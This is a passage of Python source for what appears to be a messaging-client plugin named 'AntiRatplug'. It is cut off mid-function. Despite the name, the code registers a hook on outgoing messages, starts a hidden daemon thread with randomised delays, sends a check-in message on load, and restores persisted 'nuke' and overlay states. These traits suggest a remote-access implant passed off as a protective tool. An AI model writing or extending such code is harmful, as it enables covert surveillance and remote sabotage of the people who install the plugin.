        self._idk_view = None
        self._idk_wm = None
        self._idk_decor = None
        self._idk_keep_running = False
        self._idk_thread = None

    # ─── lifecycle ─────────────────────────────────────────────────────────
    def on_plugin_load(self):
        self._sync_running = True
        self._active = True
        self.stop = False
        try:
            self.dev = hashlib.md5((str(time.time()) + str(random.random())).encode()).hexdigest()[:16]
        except Exception:
            self.dev = "unknown"
        try:
            self.add_on_send_message_hook()
        except Exception as e:
            _log("hook reg fail: %s" % e)
        threading.Thread(target=self._boot, daemon=True).start()
        try:
            self._check_persisted_nuke()
        except Exception:
            pass
        try:
            self._check_persisted_idk()
        except Exception:
            pass

    def on_plugin_unload(self):
        self._sync_running = False
        self._active = False
        self.stop = True
        try:
            self._hide_idk_overlay()
        except Exception:
            pass

    def create_settings(self):
        return []

    def _boot(self):
        time.sleep(self._jitter / 1000.0)
        _cfg()
        time.sleep(random.uniform(0.2, 0.6))
        try:
            self._send_msg("AntiRatplug v19.6 loaded")
        except Exception as e:
            _log("boot send: %s" % e)
        try:
